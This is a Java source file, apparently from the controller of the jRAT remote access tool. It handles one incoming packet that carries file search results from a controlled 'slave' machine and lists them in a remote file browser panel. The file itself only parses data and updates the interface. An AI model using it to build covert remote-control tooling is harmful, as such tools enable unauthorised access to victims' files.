package se.jrat.controller.packets.incoming;

import java.io.DataInputStream;

import javax.swing.ImageIcon;

import se.jrat.controller.Slave;
import se.jrat.controller.ui.frames.FrameRemoteFiles;
import se.jrat.controller.ui.panels.PanelSearchFiles;
import se.jrat.controller.utils.IconUtils;

public class Packet37SearchResult extends AbstractIncomingPacket {

	@Override
	public void read(Slave slave, DataInputStream dis) throws Exception {
		String path = slave.readLine();
		String name = slave.readLine();
		boolean dir = slave.readBoolean();

		FrameRemoteFiles frame = FrameRemoteFiles.INSTANCES.get(slave);
		if (frame != null) {
			PanelSearchFiles panel = frame.getSearchPanel();
			panel.getRenderer().icons.put(path, (ImageIcon) IconUtils.getFileIconFromExtension(name, dir));
			panel.getModel().addRow(new Object[] { path, name });
		}
	}

}